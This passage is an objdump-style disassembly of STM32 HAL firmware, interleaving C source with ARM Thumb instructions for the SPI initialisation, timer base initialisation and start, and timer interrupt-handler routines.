    assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));

    /* Force polarity and phase to TI protocaol requirements */
    hspi->Init.CLKPolarity = SPI_POLARITY_LOW;
 8004b1c:	687b      	ldr	r3, [r7, #4]
 8004b1e:	2200      	movs	r2, #0
 8004b20:	611a      	str	r2, [r3, #16]
    hspi->Init.CLKPhase    = SPI_PHASE_1EDGE;
 8004b22:	687b      	ldr	r3, [r7, #4]
 8004b24:	2200      	movs	r2, #0
 8004b26:	615a      	str	r2, [r3, #20]
  {
    assert_param(IS_SPI_CRC_POLYNOMIAL(hspi->Init.CRCPolynomial));
    assert_param(IS_SPI_CRC_LENGTH(hspi->Init.CRCLength));
  }
#else
  hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004b28:	687b      	ldr	r3, [r7, #4]
 8004b2a:	2200      	movs	r2, #0
 8004b2c:	629a      	str	r2, [r3, #40]	; 0x28
#endif /* USE_SPI_CRC */

  if (hspi->State == HAL_SPI_STATE_RESET)
 8004b2e:	687b      	ldr	r3, [r7, #4]
 8004b30:	f893 305d 	ldrb.w	r3, [r3, #93]	; 0x5d
 8004b34:	b2db      	uxtb	r3, r3
 8004b36:	2b00      	cmp	r3, #0
 8004b38:	d106      	bne.n	8004b48 <HAL_SPI_Init+0x58>
  {
    /* Allocate lock resource and initialize it */
    hspi->Lock = HAL_UNLOCKED;
 8004b3a:	687b      	ldr	r3, [r7, #4]
 8004b3c:	2200      	movs	r2, #0
 8004b3e:	f883 205c 	strb.w	r2, [r3, #92]	; 0x5c

    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    hspi->MspInitCallback(hspi);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_SPI_MspInit(hspi);
 8004b42:	6878      	ldr	r0, [r7, #4]
 8004b44:	f7fc f8cc 	bl	8000ce0 <HAL_SPI_MspInit>
#endif /* USE_HAL_SPI_REGISTER_CALLBACKS */
  }

  hspi->State = HAL_SPI_STATE_BUSY;
 8004b48:	687b      	ldr	r3, [r7, #4]
 8004b4a:	2202      	movs	r2, #2
 8004b4c:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  /* Disable the selected SPI peripheral */
  __HAL_SPI_DISABLE(hspi);
 8004b50:	687b      	ldr	r3, [r7, #4]
 8004b52:	681b      	ldr	r3, [r3, #0]
 8004b54:	681a      	ldr	r2, [r3, #0]
 8004b56:	687b      	ldr	r3, [r7, #4]
 8004b58:	681b      	ldr	r3, [r3, #0]
 8004b5a:	f022 0240 	bic.w	r2, r2, #64	; 0x40
 8004b5e:	601a      	str	r2, [r3, #0]

  /* Align by default the rs fifo threshold on the data size */
  if (hspi->Init.DataSize > SPI_DATASIZE_8BIT)
 8004b60:	687b      	ldr	r3, [r7, #4]
 8004b62:	68db      	ldr	r3, [r3, #12]
 8004b64:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004b68:	d902      	bls.n	8004b70 <HAL_SPI_Init+0x80>
  {
    frxth = SPI_RXFIFO_THRESHOLD_HF;
 8004b6a:	2300      	movs	r3, #0
 8004b6c:	60fb      	str	r3, [r7, #12]
 8004b6e:	e002      	b.n	8004b76 <HAL_SPI_Init+0x86>
  }
  else
  {
    frxth = SPI_RXFIFO_THRESHOLD_QF;
 8004b70:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8004b74:	60fb      	str	r3, [r7, #12]
  }

  /* CRC calculation is valid only for 16Bit and 8 Bit */
  if ((hspi->Init.DataSize != SPI_DATASIZE_16BIT) && (hspi->Init.DataSize != SPI_DATASIZE_8BIT))
 8004b76:	687b      	ldr	r3, [r7, #4]
 8004b78:	68db      	ldr	r3, [r3, #12]
 8004b7a:	f5b3 6f70 	cmp.w	r3, #3840	; 0xf00
 8004b7e:	d007      	beq.n	8004b90 <HAL_SPI_Init+0xa0>
 8004b80:	687b      	ldr	r3, [r7, #4]
 8004b82:	68db      	ldr	r3, [r3, #12]
 8004b84:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004b88:	d002      	beq.n	8004b90 <HAL_SPI_Init+0xa0>
  {
    /* CRC must be disabled */
    hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004b8a:	687b      	ldr	r3, [r7, #4]
 8004b8c:	2200      	movs	r2, #0
 8004b8e:	629a      	str	r2, [r3, #40]	; 0x28
  }

  /*----------------------- SPIx CR1 & CR2 Configuration ---------------------*/
  /* Configure : SPI Mode, Communication Mode, Clock polarity and phase, NSS management,
  Communication speed, First bit and CRC calculation state */
  WRITE_REG(hspi->Instance->CR1, ((hspi->Init.Mode & (SPI_CR1_MSTR | SPI_CR1_SSI)) |
 8004b90:	687b      	ldr	r3, [r7, #4]
 8004b92:	685b      	ldr	r3, [r3, #4]
 8004b94:	f403 7282 	and.w	r2, r3, #260	; 0x104
 8004b98:	687b      	ldr	r3, [r7, #4]
 8004b9a:	689b      	ldr	r3, [r3, #8]
 8004b9c:	f403 4304 	and.w	r3, r3, #33792	; 0x8400
 8004ba0:	431a      	orrs	r2, r3
 8004ba2:	687b      	ldr	r3, [r7, #4]
 8004ba4:	691b      	ldr	r3, [r3, #16]
 8004ba6:	f003 0302 	and.w	r3, r3, #2
 8004baa:	431a      	orrs	r2, r3
 8004bac:	687b      	ldr	r3, [r7, #4]
 8004bae:	695b      	ldr	r3, [r3, #20]
 8004bb0:	f003 0301 	and.w	r3, r3, #1
 8004bb4:	431a      	orrs	r2, r3
 8004bb6:	687b      	ldr	r3, [r7, #4]
 8004bb8:	699b      	ldr	r3, [r3, #24]
 8004bba:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004bbe:	431a      	orrs	r2, r3
 8004bc0:	687b      	ldr	r3, [r7, #4]
 8004bc2:	69db      	ldr	r3, [r3, #28]
 8004bc4:	f003 0338 	and.w	r3, r3, #56	; 0x38
 8004bc8:	431a      	orrs	r2, r3
 8004bca:	687b      	ldr	r3, [r7, #4]
 8004bcc:	6a1b      	ldr	r3, [r3, #32]
 8004bce:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004bd2:	ea42 0103 	orr.w	r1, r2, r3
 8004bd6:	687b      	ldr	r3, [r7, #4]
 8004bd8:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004bda:	f403 5200 	and.w	r2, r3, #8192	; 0x2000
 8004bde:	687b      	ldr	r3, [r7, #4]
 8004be0:	681b      	ldr	r3, [r3, #0]
 8004be2:	430a      	orrs	r2, r1
 8004be4:	601a      	str	r2, [r3, #0]
    }
  }
#endif /* USE_SPI_CRC */

  /* Configure : NSS management, TI Mode, NSS Pulse, Data size and Rx Fifo threshold */
  WRITE_REG(hspi->Instance->CR2, (((hspi->Init.NSS >> 16U) & SPI_CR2_SSOE) |
 8004be6:	687b      	ldr	r3, [r7, #4]
 8004be8:	699b      	ldr	r3, [r3, #24]
 8004bea:	0c1b      	lsrs	r3, r3, #16
 8004bec:	f003 0204 	and.w	r2, r3, #4
 8004bf0:	687b      	ldr	r3, [r7, #4]
 8004bf2:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004bf4:	f003 0310 	and.w	r3, r3, #16
 8004bf8:	431a      	orrs	r2, r3
 8004bfa:	687b      	ldr	r3, [r7, #4]
 8004bfc:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004bfe:	f003 0308 	and.w	r3, r3, #8
 8004c02:	431a      	orrs	r2, r3
 8004c04:	687b      	ldr	r3, [r7, #4]
 8004c06:	68db      	ldr	r3, [r3, #12]
 8004c08:	f403 6370 	and.w	r3, r3, #3840	; 0xf00
 8004c0c:	ea42 0103 	orr.w	r1, r2, r3
 8004c10:	68fb      	ldr	r3, [r7, #12]
 8004c12:	f403 5280 	and.w	r2, r3, #4096	; 0x1000
 8004c16:	687b      	ldr	r3, [r7, #4]
 8004c18:	681b      	ldr	r3, [r3, #0]
 8004c1a:	430a      	orrs	r2, r1
 8004c1c:	605a      	str	r2, [r3, #4]
#if defined(SPI_I2SCFGR_I2SMOD)
  /* Activate the SPI mode (Make sure that I2SMOD bit in I2SCFGR register is reset) */
  CLEAR_BIT(hspi->Instance->I2SCFGR, SPI_I2SCFGR_I2SMOD);
#endif /* SPI_I2SCFGR_I2SMOD */

  hspi->ErrorCode = HAL_SPI_ERROR_NONE;
 8004c1e:	687b      	ldr	r3, [r7, #4]
 8004c20:	2200      	movs	r2, #0
 8004c22:	661a      	str	r2, [r3, #96]	; 0x60
  hspi->State     = HAL_SPI_STATE_READY;
 8004c24:	687b      	ldr	r3, [r7, #4]
 8004c26:	2201      	movs	r2, #1
 8004c28:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  return HAL_OK;
 8004c2c:	2300      	movs	r3, #0
}
 8004c2e:	4618      	mov	r0, r3
 8004c30:	3710      	adds	r7, #16
 8004c32:	46bd      	mov	sp, r7
 8004c34:	bd80      	pop	{r7, pc}

08004c36 <HAL_TIM_Base_Init>:
  *         Ex: call @ref HAL_TIM_Base_DeInit() before HAL_TIM_Base_Init()
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Init(TIM_HandleTypeDef *htim)
{
 8004c36:	b580      	push	{r7, lr}
 8004c38:	b082      	sub	sp, #8
 8004c3a:	af00      	add	r7, sp, #0
 8004c3c:	6078      	str	r0, [r7, #4]
  /* Check the TIM handle allocation */
  if (htim == NULL)
 8004c3e:	687b      	ldr	r3, [r7, #4]
 8004c40:	2b00      	cmp	r3, #0
 8004c42:	d101      	bne.n	8004c48 <HAL_TIM_Base_Init+0x12>
  {
    return HAL_ERROR;
 8004c44:	2301      	movs	r3, #1
 8004c46:	e049      	b.n	8004cdc <HAL_TIM_Base_Init+0xa6>
  assert_param(IS_TIM_COUNTER_MODE(htim->Init.CounterMode));
  assert_param(IS_TIM_CLOCKDIVISION_DIV(htim->Init.ClockDivision));
  assert_param(IS_TIM_PERIOD(htim, htim->Init.Period));
  assert_param(IS_TIM_AUTORELOAD_PRELOAD(htim->Init.AutoReloadPreload));

  if (htim->State == HAL_TIM_STATE_RESET)
 8004c48:	687b      	ldr	r3, [r7, #4]
 8004c4a:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004c4e:	b2db      	uxtb	r3, r3
 8004c50:	2b00      	cmp	r3, #0
 8004c52:	d106      	bne.n	8004c62 <HAL_TIM_Base_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    htim->Lock = HAL_UNLOCKED;
 8004c54:	687b      	ldr	r3, [r7, #4]
 8004c56:	2200      	movs	r2, #0
 8004c58:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
    }
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    htim->Base_MspInitCallback(htim);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    HAL_TIM_Base_MspInit(htim);
 8004c5c:	6878      	ldr	r0, [r7, #4]
 8004c5e:	f7fc f943 	bl	8000ee8 <HAL_TIM_Base_MspInit>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004c62:	687b      	ldr	r3, [r7, #4]
 8004c64:	2202      	movs	r2, #2
 8004c66:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Set the Time Base configuration */
  TIM_Base_SetConfig(htim->Instance, &htim->Init);
 8004c6a:	687b      	ldr	r3, [r7, #4]
 8004c6c:	681a      	ldr	r2, [r3, #0]
 8004c6e:	687b      	ldr	r3, [r7, #4]
 8004c70:	3304      	adds	r3, #4
 8004c72:	4619      	mov	r1, r3
 8004c74:	4610      	mov	r0, r2
 8004c76:	f000 fa7d 	bl	8005174 <TIM_Base_SetConfig>

  /* Initialize the DMA burst operation state */
  htim->DMABurstState = HAL_DMA_BURST_STATE_READY;
 8004c7a:	687b      	ldr	r3, [r7, #4]
 8004c7c:	2201      	movs	r2, #1
 8004c7e:	f883 2048 	strb.w	r2, [r3, #72]	; 0x48

  /* Initialize the TIM channels state */
  TIM_CHANNEL_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004c82:	687b      	ldr	r3, [r7, #4]
 8004c84:	2201      	movs	r2, #1
 8004c86:	f883 203e 	strb.w	r2, [r3, #62]	; 0x3e
 8004c8a:	687b      	ldr	r3, [r7, #4]
 8004c8c:	2201      	movs	r2, #1
 8004c8e:	f883 203f 	strb.w	r2, [r3, #63]	; 0x3f
 8004c92:	687b      	ldr	r3, [r7, #4]
 8004c94:	2201      	movs	r2, #1
 8004c96:	f883 2040 	strb.w	r2, [r3, #64]	; 0x40
 8004c9a:	687b      	ldr	r3, [r7, #4]
 8004c9c:	2201      	movs	r2, #1
 8004c9e:	f883 2041 	strb.w	r2, [r3, #65]	; 0x41
 8004ca2:	687b      	ldr	r3, [r7, #4]
 8004ca4:	2201      	movs	r2, #1
 8004ca6:	f883 2042 	strb.w	r2, [r3, #66]	; 0x42
 8004caa:	687b      	ldr	r3, [r7, #4]
 8004cac:	2201      	movs	r2, #1
 8004cae:	f883 2043 	strb.w	r2, [r3, #67]	; 0x43
  TIM_CHANNEL_N_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004cb2:	687b      	ldr	r3, [r7, #4]
 8004cb4:	2201      	movs	r2, #1
 8004cb6:	f883 2044 	strb.w	r2, [r3, #68]	; 0x44
 8004cba:	687b      	ldr	r3, [r7, #4]
 8004cbc:	2201      	movs	r2, #1
 8004cbe:	f883 2045 	strb.w	r2, [r3, #69]	; 0x45
 8004cc2:	687b      	ldr	r3, [r7, #4]
 8004cc4:	2201      	movs	r2, #1
 8004cc6:	f883 2046 	strb.w	r2, [r3, #70]	; 0x46
 8004cca:	687b      	ldr	r3, [r7, #4]
 8004ccc:	2201      	movs	r2, #1
 8004cce:	f883 2047 	strb.w	r2, [r3, #71]	; 0x47

  /* Initialize the TIM state*/
  htim->State = HAL_TIM_STATE_READY;
 8004cd2:	687b      	ldr	r3, [r7, #4]
 8004cd4:	2201      	movs	r2, #1
 8004cd6:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  return HAL_OK;
 8004cda:	2300      	movs	r3, #0
}
 8004cdc:	4618      	mov	r0, r3
 8004cde:	3708      	adds	r7, #8
 8004ce0:	46bd      	mov	sp, r7
 8004ce2:	bd80      	pop	{r7, pc}

08004ce4 <HAL_TIM_Base_Start_IT>:
  * @brief  Starts the TIM Base generation in interrupt mode.
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Start_IT(TIM_HandleTypeDef *htim)
{
 8004ce4:	b480      	push	{r7}
 8004ce6:	b085      	sub	sp, #20
 8004ce8:	af00      	add	r7, sp, #0
 8004cea:	6078      	str	r0, [r7, #4]

  /* Check the parameters */
  assert_param(IS_TIM_INSTANCE(htim->Instance));

  /* Check the TIM state */
  if (htim->State != HAL_TIM_STATE_READY)
 8004cec:	687b      	ldr	r3, [r7, #4]
 8004cee:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004cf2:	b2db      	uxtb	r3, r3
 8004cf4:	2b01      	cmp	r3, #1
 8004cf6:	d001      	beq.n	8004cfc <HAL_TIM_Base_Start_IT+0x18>
  {
    return HAL_ERROR;
 8004cf8:	2301      	movs	r3, #1
 8004cfa:	e03b      	b.n	8004d74 <HAL_TIM_Base_Start_IT+0x90>
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004cfc:	687b      	ldr	r3, [r7, #4]
 8004cfe:	2202      	movs	r2, #2
 8004d00:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Enable the TIM Update interrupt */
  __HAL_TIM_ENABLE_IT(htim, TIM_IT_UPDATE);
 8004d04:	687b      	ldr	r3, [r7, #4]
 8004d06:	681b      	ldr	r3, [r3, #0]
 8004d08:	68da      	ldr	r2, [r3, #12]
 8004d0a:	687b      	ldr	r3, [r7, #4]
 8004d0c:	681b      	ldr	r3, [r3, #0]
 8004d0e:	f042 0201 	orr.w	r2, r2, #1
 8004d12:	60da      	str	r2, [r3, #12]

  /* Enable the Peripheral, except in trigger mode where enable is automatically done with trigger */
  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 8004d14:	687b      	ldr	r3, [r7, #4]
 8004d16:	681b      	ldr	r3, [r3, #0]
 8004d18:	4a19      	ldr	r2, [pc, #100]	; (8004d80 <HAL_TIM_Base_Start_IT+0x9c>)
 8004d1a:	4293      	cmp	r3, r2
 8004d1c:	d009      	beq.n	8004d32 <HAL_TIM_Base_Start_IT+0x4e>
 8004d1e:	687b      	ldr	r3, [r7, #4]
 8004d20:	681b      	ldr	r3, [r3, #0]
 8004d22:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8004d26:	d004      	beq.n	8004d32 <HAL_TIM_Base_Start_IT+0x4e>
 8004d28:	687b      	ldr	r3, [r7, #4]
 8004d2a:	681b      	ldr	r3, [r3, #0]
 8004d2c:	4a15      	ldr	r2, [pc, #84]	; (8004d84 <HAL_TIM_Base_Start_IT+0xa0>)
 8004d2e:	4293      	cmp	r3, r2
 8004d30:	d115      	bne.n	8004d5e <HAL_TIM_Base_Start_IT+0x7a>
  {
    tmpsmcr = htim->Instance->SMCR & TIM_SMCR_SMS;
 8004d32:	687b      	ldr	r3, [r7, #4]
 8004d34:	681b      	ldr	r3, [r3, #0]
 8004d36:	689a      	ldr	r2, [r3, #8]
 8004d38:	4b13      	ldr	r3, [pc, #76]	; (8004d88 <HAL_TIM_Base_Start_IT+0xa4>)
 8004d3a:	4013      	ands	r3, r2
 8004d3c:	60fb      	str	r3, [r7, #12]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004d3e:	68fb      	ldr	r3, [r7, #12]
 8004d40:	2b06      	cmp	r3, #6
 8004d42:	d015      	beq.n	8004d70 <HAL_TIM_Base_Start_IT+0x8c>
 8004d44:	68fb      	ldr	r3, [r7, #12]
 8004d46:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8004d4a:	d011      	beq.n	8004d70 <HAL_TIM_Base_Start_IT+0x8c>
    {
      __HAL_TIM_ENABLE(htim);
 8004d4c:	687b      	ldr	r3, [r7, #4]
 8004d4e:	681b      	ldr	r3, [r3, #0]
 8004d50:	681a      	ldr	r2, [r3, #0]
 8004d52:	687b      	ldr	r3, [r7, #4]
 8004d54:	681b      	ldr	r3, [r3, #0]
 8004d56:	f042 0201 	orr.w	r2, r2, #1
 8004d5a:	601a      	str	r2, [r3, #0]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004d5c:	e008      	b.n	8004d70 <HAL_TIM_Base_Start_IT+0x8c>
    }
  }
  else
  {
    __HAL_TIM_ENABLE(htim);
 8004d5e:	687b      	ldr	r3, [r7, #4]
 8004d60:	681b      	ldr	r3, [r3, #0]
 8004d62:	681a      	ldr	r2, [r3, #0]
 8004d64:	687b      	ldr	r3, [r7, #4]
 8004d66:	681b      	ldr	r3, [r3, #0]
 8004d68:	f042 0201 	orr.w	r2, r2, #1
 8004d6c:	601a      	str	r2, [r3, #0]
 8004d6e:	e000      	b.n	8004d72 <HAL_TIM_Base_Start_IT+0x8e>
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004d70:	bf00      	nop
  }

  /* Return function status */
  return HAL_OK;
 8004d72:	2300      	movs	r3, #0
}
 8004d74:	4618      	mov	r0, r3
 8004d76:	3714      	adds	r7, #20
 8004d78:	46bd      	mov	sp, r7
 8004d7a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004d7e:	4770      	bx	lr
 8004d80:	40012c00 	.word	0x40012c00
 8004d84:	40014000 	.word	0x40014000
 8004d88:	00010007 	.word	0x00010007

08004d8c <HAL_TIM_IRQHandler>:
  * @brief  This function handles TIM interrupts requests.
  * @param  htim TIM  handle
  * @retval None
  */
void HAL_TIM_IRQHandler(TIM_HandleTypeDef *htim)
{
 8004d8c:	b580      	push	{r7, lr}
 8004d8e:	b084      	sub	sp, #16
 8004d90:	af00      	add	r7, sp, #0
 8004d92:	6078      	str	r0, [r7, #4]
  uint32_t itsource = htim->Instance->DIER;
 8004d94:	687b      	ldr	r3, [r7, #4]
 8004d96:	681b      	ldr	r3, [r3, #0]
 8004d98:	68db      	ldr	r3, [r3, #12]
 8004d9a:	60fb      	str	r3, [r7, #12]
  uint32_t itflag   = htim->Instance->SR;
 8004d9c:	687b      	ldr	r3, [r7, #4]
 8004d9e:	681b      	ldr	r3, [r3, #0]
 8004da0:	691b      	ldr	r3, [r3, #16]
 8004da2:	60bb      	str	r3, [r7, #8]

  /* Capture compare 1 event */
  if ((itflag & (TIM_FLAG_CC1)) == (TIM_FLAG_CC1))
 8004da4:	68bb      	ldr	r3, [r7, #8]
 8004da6:	f003 0302 	and.w	r3, r3, #2
 8004daa:	2b00      	cmp	r3, #0
 8004dac:	d020      	beq.n	8004df0 <HAL_TIM_IRQHandler+0x64>
  {
    if ((itsource & (TIM_IT_CC1)) == (TIM_IT_CC1))
 8004dae:	68fb      	ldr	r3, [r7, #12]
 8004db0:	f003 0302 	and.w	r3, r3, #2
 8004db4:	2b00      	cmp	r3, #0
 8004db6:	d01b      	beq.n	8004df0 <HAL_TIM_IRQHandler+0x64>
    {
      {
        __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC1);
 8004db8:	687b      	ldr	r3, [r7, #4]
 8004dba:	681b      	ldr	r3, [r3, #0]
 8004dbc:	f06f 0202 	mvn.w	r2, #2
 8004dc0:	611a      	str	r2, [r3, #16]
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_1;
 8004dc2:	687b      	ldr	r3, [r7, #4]
 8004dc4:	2201      	movs	r2, #1
 8004dc6:	771a      	strb	r2, [r3, #28]

        /* Input capture event */
        if ((htim->Instance->CCMR1 & TIM_CCMR1_CC1S) != 0x00U)
 8004dc8:	687b      	ldr	r3, [r7, #4]
 8004dca:	681b      	ldr	r3, [r3, #0]
 8004dcc:	699b      	ldr	r3, [r3, #24]
 8004dce:	f003 0303 	and.w	r3, r3, #3
 8004dd2:	2b00      	cmp	r3, #0
 8004dd4:	d003      	beq.n	8004dde <HAL_TIM_IRQHandler+0x52>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->IC_CaptureCallback(htim);
#else
          HAL_TIM_IC_CaptureCallback(htim);
 8004dd6:	6878      	ldr	r0, [r7, #4]
 8004dd8:	f000 f9ad 	bl	8005136 <HAL_TIM_IC_CaptureCallback>
 8004ddc:	e005      	b.n	8004dea <HAL_TIM_IRQHandler+0x5e>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->OC_DelayElapsedCallback(htim);
          htim->PWM_PulseFinishedCallback(htim);
#else
          HAL_TIM_OC_DelayElapsedCallback(htim);
 8004dde:	6878      	ldr	r0, [r7, #4]
 8004de0:	f000 f99f 	bl	8005122 <HAL_TIM_OC_DelayElapsedCallback>
          HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004de4:	6878      	ldr	r0, [r7, #4]
 8004de6:	f000 f9b0 	bl	800514a <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
        }
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004dea:	687b      	ldr	r3, [r7, #4]
 8004dec:	2200      	movs	r2, #0
 8004dee:	771a      	strb	r2, [r3, #28]
      }
    }
  }
  /* Capture compare 2 event */
  if ((itflag & (TIM_FLAG_CC2)) == (TIM_FLAG_CC2))
 8004df0:	68bb      	ldr	r3, [r7, #8]
 8004df2:	f003 0304 	and.w	r3, r3, #4
 8004df6:	2b00      	cmp	r3, #0
 8004df8:	d020      	beq.n	8004e3c <HAL_TIM_IRQHandler+0xb0>
  {
    if ((itsource & (TIM_IT_CC2)) == (TIM_IT_CC2))
 8004dfa:	68fb      	ldr	r3, [r7, #12]
 8004dfc:	f003 0304 	and.w	r3, r3, #4
 8004e00:	2b00      	cmp	r3, #0
 8004e02:	d01b      	beq.n	8004e3c <HAL_TIM_IRQHandler+0xb0>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC2);
 8004e04:	687b      	ldr	r3, [r7, #4]
 8004e06:	681b      	ldr	r3, [r3, #0]
 8004e08:	f06f 0204 	mvn.w	r2, #4
 8004e0c:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_2;
 8004e0e:	687b      	ldr	r3, [r7, #4]
 8004e10:	2202      	movs	r2, #2
 8004e12:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR1 & TIM_CCMR1_CC2S) != 0x00U)
 8004e14:	687b      	ldr	r3, [r7, #4]
 8004e16:	681b      	ldr	r3, [r3, #0]
 8004e18:	699b      	ldr	r3, [r3, #24]
 8004e1a:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004e1e:	2b00      	cmp	r3, #0
 8004e20:	d003      	beq.n	8004e2a <HAL_TIM_IRQHandler+0x9e>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004e22:	6878      	ldr	r0, [r7, #4]
 8004e24:	f000 f987 	bl	8005136 <HAL_TIM_IC_CaptureCallback>
 8004e28:	e005      	b.n	8004e36 <HAL_TIM_IRQHandler+0xaa>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004e2a:	6878      	ldr	r0, [r7, #4]
 8004e2c:	f000 f979 	bl	8005122 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004e30:	6878      	ldr	r0, [r7, #4]
 8004e32:	f000 f98a 	bl	800514a <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004e36:	687b      	ldr	r3, [r7, #4]
 8004e38:	2200      	movs	r2, #0
 8004e3a:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 3 event */
  if ((itflag & (TIM_FLAG_CC3)) == (TIM_FLAG_CC3))
 8004e3c:	68bb      	ldr	r3, [r7, #8]
 8004e3e:	f003 0308 	and.w	r3, r3, #8
 8004e42:	2b00      	cmp	r3, #0
 8004e44:	d020      	beq.n	8004e88 <HAL_TIM_IRQHandler+0xfc>
  {
    if ((itsource & (TIM_IT_CC3)) == (TIM_IT_CC3))
 8004e46:	68fb      	ldr	r3, [r7, #12]
 8004e48:	f003 0308 	and.w	r3, r3, #8
 8004e4c:	2b00      	cmp	r3, #0
 8004e4e:	d01b      	beq.n	8004e88 <HAL_TIM_IRQHandler+0xfc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC3);
 8004e50:	687b      	ldr	r3, [r7, #4]
 8004e52:	681b      	ldr	r3, [r3, #0]
 8004e54:	f06f 0208 	mvn.w	r2, #8
 8004e58:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_3;
 8004e5a:	687b      	ldr	r3, [r7, #4]
 8004e5c:	2204      	movs	r2, #4
 8004e5e:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC3S) != 0x00U)
 8004e60:	687b      	ldr	r3, [r7, #4]
 8004e62:	681b      	ldr	r3, [r3, #0]
 8004e64:	69db      	ldr	r3, [r3, #28]
 8004e66:	f003 0303 	and.w	r3, r3, #3
 8004e6a:	2b00      	cmp	r3, #0
 8004e6c:	d003      	beq.n	8004e76 <HAL_TIM_IRQHandler+0xea>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004e6e:	6878      	ldr	r0, [r7, #4]
 8004e70:	f000 f961 	bl	8005136 <HAL_TIM_IC_CaptureCallback>
 8004e74:	e005      	b.n	8004e82 <HAL_TIM_IRQHandler+0xf6>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004e76:	6878      	ldr	r0, [r7, #4]
 8004e78:	f000 f953 	bl	8005122 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004e7c:	6878      	ldr	r0, [r7, #4]
 8004e7e:	f000 f964 	bl	800514a <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004e82:	687b      	ldr	r3, [r7, #4]
 8004e84:	2200      	movs	r2, #0
 8004e86:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 4 event */
  if ((itflag & (TIM_FLAG_CC4)) == (TIM_FLAG_CC4))
 8004e88:	68bb      	ldr	r3, [r7, #8]
 8004e8a:	f003 0310 	and.w	r3, r3, #16
 8004e8e:	2b00      	cmp	r3, #0
 8004e90:	d020      	beq.n	8004ed4 <HAL_TIM_IRQHandler+0x148>
  {
    if ((itsource & (TIM_IT_CC4)) == (TIM_IT_CC4))
 8004e92:	68fb      	ldr	r3, [r7, #12]
